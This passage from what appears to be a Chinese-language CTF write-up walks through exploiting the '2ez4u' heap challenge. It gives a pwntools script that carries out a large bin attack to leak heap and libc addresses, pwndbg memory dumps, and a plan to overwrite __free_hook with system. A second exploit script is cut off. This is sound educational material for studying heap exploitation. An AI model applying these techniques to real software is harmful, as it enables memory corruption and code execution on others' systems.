class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'x86-64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./2ez4u"</span>, env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line">base_addr = <span class="number">0x0000555555554000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1000'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'17'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'0'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'1'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'2'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'3'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'5'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'7'</span>*<span class="number">0x3f0</span>) <span class="comment"># playground</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'8'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">'9'</span>*<span class="number">0x3d0</span>) <span class="comment"># sup</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'a'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'b'</span>*<span class="number">0x3e0</span>) <span class="comment"># victim</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'c'</span>*<span class="number">0x30</span> )</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x9</span>)</span><br><span class="line">dele(<span class="number">0xb</span>)</span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'0'</span>*<span class="number">0x400</span>)</span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)</span><br><span class="line">io.recvuntil(<span class="string">'num: '</span>)</span><br><span class="line">print(hex(c_uint32(int(io.recvline()[:<span class="number">-1</span>])).value))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">HEAP = u64(io.recvline()[:<span class="number">-1</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0x7e0</span></span><br><span class="line">log.info(<span class="string">"heap base 0x%016x"</span> % HEAP)</span><br><span class="line"></span><br><span class="line">target_addr = HEAP+<span class="number">0xb0</span>     <span class="comment"># 1</span></span><br><span class="line">chunk1_addr = HEAP+<span class="number">0x130</span>    <span class="comment"># 2</span></span><br><span class="line">chunk2_addr = HEAP+<span class="number">0x1b0</span>    <span class="comment"># 3</span></span><br><span class="line">victim_addr = HEAP+<span class="number">0xc30</span>    <span class="comment"># b</span></span><br><span class="line">log.info(<span class="string">"target_addr 0x%016x"</span> % target_addr)</span><br><span class="line">log.info(<span class="string">"chunk1_addr 0x%016x"</span> % chunk1_addr)</span><br><span class="line">log.info(<span class="string">"chunk2_addr 0x%016x"</span> % chunk2_addr)</span><br><span class="line">log.info(<span class="string">"victim_addr 0x%016x"</span> % victim_addr)</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x%x'</span> % (base_addr+<span class="number">0x124e</span>))</span><br><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(chunk1_addr))             <span class="comment"># victim</span></span><br><span class="line">edit(<span class="number">0x1</span>, p64(<span class="number">0x0</span>)+p64(chunk1_addr))    <span class="comment"># target</span></span><br><span class="line">chunk2  = p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x421</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(chunk1_addr)</span><br><span class="line">edit(<span class="number">0x3</span>, chunk2) <span class="comment"># chunk2</span></span><br><span class="line">chunk1  = <span class="string">''</span></span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x411</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x18</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x10</span>)</span><br><span class="line">chunk1 += p64(victim_addr)</span><br><span class="line">chunk1 += p64(chunk2_addr)</span><br><span class="line">edit(<span class="number">0x2</span>, chunk1) <span class="comment"># chunk1</span></span><br><span class="line">edit(<span class="number">0x7</span>, <span class="string">'7'</span>*<span class="number">0x198</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x411</span>))  </span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line">dele(<span class="number">0x3</span>)</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'3'</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>)) <span class="comment"># chunk1, arbitrary write !!!!!!! </span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">show(<span class="number">0x3</span>) <span class="comment">## 伪造的堆块中包含small bin，leak libc地址</span></span><br><span class="line">io.recvuntil(<span class="string">'3'</span>*<span class="number">0x30</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">LIBC = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3c4be8</span></span><br><span class="line">log.info(<span class="string">"libc base 0x%016x"</span> % LIBC)</span><br></pre></td></tr></table></figure><p>这部分的调试过程比较简单，就在我脚本里那个地方下断，就可以在每次添加删除或修改执行完，返回生成菜单的代码处断下，查看每次修改结果，不再详细描述。<br>利用思路需要再整理一下，我们每次能够改变的是desc<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-092203.jpg" alt=""></p><p>在large bin attack开始前断下，并查看修改前的index b。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1 at 0x55555555524e</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /32gx 0x555555756040</span><br><span class="line">0x555555756040:0x00000400000000010x00005555557580a0-&gt;0</span><br><span class="line">0x555555756050:0x00000060000000010x0000555555757090-&gt;1</span><br><span class="line">0x555555756060:0x00000060000000010x0000555555757110-&gt;2</span><br><span class="line">0x555555756070:0x00000060000000010x0000555555757190-&gt;3</span><br><span class="line">0x555555756080:0x00000060000000010x0000555555757210-&gt;4</span><br><span class="line">0x555555756090:0x00000060000000010x0000555555757290-&gt;5</span><br><span class="line">0x5555557560a0:0x00000060000000010x0000555555757310-&gt;6</span><br><span class="line">0x5555557560b0:0x000003f0000000010x0000555555757390-&gt;7</span><br><span class="line">0x5555557560c0:0x00000030000000010x00005555557577a0-&gt;8</span><br><span class="line">0x5555557560d0:0x000003e0000000000x00005555557577f0-&gt;9</span><br><span class="line">0x5555557560e0:0x00000030000000010x0000555555757bf0-&gt;a</span><br><span class="line">0x5555557560f0:0x000003f0000000000x0000555555757c40-&gt;b</span><br><span class="line">0x555555756100:0x00000030000000010x0000555555758050-&gt;c</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x /20gx 0x0000555555757c40</span><br><span class="line">0x555555757c40:0x00005555557577e00x00007ffff7dd1f68</span><br><span class="line">0x555555757c50:0x00005555557577e00x00005555557577e0-&gt;修改前bk_nextsize的指向为最小的chunk</span><br><span class="line">0x555555757c60:0x62626262626262620x6262626262626262</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-043147.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target_addr = HEAP+0xb0     # 在index 1中</span><br><span class="line">chunk1_addr = HEAP+0x130    # 在index 2中</span><br><span class="line">chunk2_addr = HEAP+0x1b0    # 在index 3中</span><br><span class="line">victim_addr = HEAP+0xc30    # 在index b中</span><br></pre></td></tr></table></figure></p><p>修改后,执行完edit(0xb, p64(chunk1_addr))，再在生成菜单的代码前断下，此时bk_nextsize指向伪造的chunk1,chunk1将在chunk1_addr这个地址构造。<br>最终构造出：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-051317.jpg" alt=""><br>绕过p-&gt;fd-&gt;bk=p和p-&gt;bk-&gt;fd=p<br>以及p-&gt;bk_nextsize-&gt;fd_nextsize=p和p-&gt;fd_nextsize-&gt;bk_nextsize=p<br>同时要注意<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x0000555555757c30</span><br><span class="line">0x555555757c30:0x00616161616161610x0000000000000411</span><br><span class="line">0x555555757c40:0x00005555557577e00x00007ffff7dd1f68</span><br><span class="line">0x555555757c50:0x00005555557577e00x0000555555757130</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /20gx 0x00005555557577e0</span><br><span class="line">0x5555557577e0:0x00383838383838380x0000000000000401</span><br><span class="line">0x5555557577f0:0x00007ffff7dd1f680x0000555555757c30</span><br><span class="line">0x555555757800:0x0000555555757c300x0000555555757c30</span><br><span class="line">0x555555757810:0x39393939393939390x3939393939393939</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /20gx 0x00005555557571b0</span><br><span class="line">0x5555557571b0:0x00000000000000000x0000000000000421</span><br><span class="line">0x5555557571c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571d0:0x00005555557571300x3333333333333300</span><br><span class="line">0x5555557571e0:0x33333333333333330x3333333333333333</span><br><span class="line">0x5555557571f0:0x33333333333333330x3333333333333333</span><br><span class="line">0x555555757200:0x00333333333333330x0000000000000081</span><br><span class="line">0x555555757210:0x00000000000000000x0000000000000000</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /20gx 0x0000555555757130</span><br><span class="line">0x555555757130:0x00000000000000000x0000000000000411</span><br><span class="line">0x555555757140:0x00005555557570980x00005555557570a0</span><br><span class="line">0x555555757150:0x0000555555757c300x00005555557571b0</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x0000555555757098</span><br><span class="line">0x555555757098:0x00000000000000000x0000000000000001</span><br><span class="line">0x5555557570a8:0x00000000000000000x0000555555757130</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /20gx 0x00005555557570a0</span><br><span class="line">0x5555557570a0:0x00000000000000010x0000000000000000</span><br><span class="line">0x5555557570b0:0x00005555557571300x3131313131313100</span><br></pre></td></tr></table></figure><p>注意这句话edit(0x7, ‘7’*0x198+p64(0x410)+p64(0x411))<br>它是为了保证size的大小一致，在“相邻”的下一个chunk设置好prev_size。<br>chunk1的addr为130，加上size即410就是540.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x000055555575754</span><br><span class="line">0x555555757540:0x0000000000000410-&gt;prev_sieze0x0000000000000411</span><br><span class="line">0x555555757550:0x37373737373737000x3737373737373737</span><br><span class="line">0x555555757560:0x37373737373737370x3737373737373737</span><br></pre></td></tr></table></figure></p><p>构造好之后，就是先删除6和3这两个大小在small bins范围里的chunk。<br>顺便一提，small bins是FIFO的规则，所以同一个链表中先被释放的chunk会先被分配出去。</p><p>然后再add(0x3f0, ‘3’*0x30+p64(0xdeadbeefdeadbeef))<br>因为我们之前说过了large bins的分配，首先找到first(bins)，也就是free chunk的第一个，因为这是这条链里最大的，这里就是c30，然后从它的bk_nextsize开始遍历，即从130开始遍历，这里的130是我们伪造好的，它的大小为410，就被分配出去了。<br>检查一下，确实是这样，它被分配到了index 3的位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /32gx 0x555555756040</span><br><span class="line">0x555555756040:0x00000400000000010x00005555557580a0</span><br><span class="line">0x555555756050:0x00000060000000010x0000555555757090</span><br><span class="line">0x555555756060:0x00000060000000010x0000555555757110</span><br><span class="line">0x555555756070:0x000003f0000000010x0000555555757140</span><br><span class="line">0x555555756080:0x00000060000000010x0000555555757210</span><br><span class="line">0x555555756090:0x00000060000000010x0000555555757290</span><br></pre></td></tr></table></figure></p><p>也可以看出触发了unlink<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /6gx 0x0000555555757c30</span><br><span class="line">0x555555757c30:0x00616161616161610x0000000000000411</span><br><span class="line">0x555555757c40:0x00005555557577e00x00007ffff7dd1f68</span><br><span class="line">0x555555757c50:0x00005555557577e00x00005555557571b0</span><br><span class="line">pwndbg&gt; x /6gx 0x00005555557571b0</span><br><span class="line">0x5555557571b0:0x00000000000000000x0000000000000421</span><br><span class="line">0x5555557571c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571d0:0x0000555555757c300x3333333333333300</span><br></pre></td></tr></table></figure></p><p>因为之前的index 3即0x0000555555757190就是small bin，而它被包含在我们伪造的chunk的大小（130-540）中，所以被leak出来，其fd的值就在libc中。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-053914.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /50gx 0x0000555555757130</span><br><span class="line">0x555555757130:0x00000000000000000x0000000000000411</span><br><span class="line">0x555555757140:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757150:0x00005555000000030x3333333333333333</span><br><span class="line">0x555555757160:0x33333333333333330x3333333333333333</span><br><span class="line">0x555555757170:0x33333333333333330x3333333333333333</span><br><span class="line">0x555555757180:0x33333333333333330xdeadbeefdeadbeef</span><br><span class="line">0x555555757190:0x00007ffff7dd1be8-&gt;libc0x0000555555757300</span><br></pre></td></tr></table></figure><p>leak出的libc并不是基地址，还要减去偏移，我不大清楚应该这么算，但是关了ASLR之后，我们可以看到基地址，先leak一遍然后算出编译，然后再重新运行leak脚本，把这个偏移值减去即可，有人知道怎么算的话，可以告知我一下~谢谢。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-060419.png" alt=""><br>最终leak出的libc地址为：0x00007ffff7a0d000</p><h3 id="覆盖-free-hook指针"><a href="#覆盖-free-hook指针" class="headerlink" title="覆盖__free_hook指针"></a>覆盖__free_hook指针</h3><p>利用这个malloc出来的chunk来修改fastbin的fd<br>通过修改fd,来malloc出top前一块空间，然后这样就可以修改main_arena上的top为free_hook上面一些的地方。<br>通过几次malloc，修改free_hook为system的地址</p><p>这部分的堆构造比较复杂，不过只要注意到是怎么在我们malloc出的fake_chunk里free出一个fastbin，后面就可以通过更改fastbin的fd指针，结合UAF实现任意地址写了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'x86-64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./2ez4u"</span>, env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line">base_addr = <span class="number">0x0000555555554000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1000'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'17'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'0'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x60</span>,  <span 